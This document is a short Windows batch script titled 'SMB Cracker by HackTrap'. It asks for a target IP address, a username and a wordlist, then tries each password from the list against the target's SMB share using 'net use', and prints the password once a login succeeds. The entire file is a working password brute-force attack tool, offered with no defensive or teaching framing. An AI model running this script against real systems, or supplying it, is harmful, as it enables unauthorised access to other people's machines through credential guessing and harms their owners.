@echo off 
color A

title SMB Cracker by HackTrap

echo Created By HackTrap
echo.
echo.
                                                                                                                                                                          
set /p ip="enter the ip address: "
set /p user="enter the username: "
set /p wordlist="enter the wordlist: "


set /a count=0
for /f %%a in (%wordlist%) do (
 set pass=%%a
 call :try
)
echo password not found ): try to use another wordlist or username 
pause
exit

:wow
echo.
echo bro hacked smb: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:try
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [TRY %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto wow





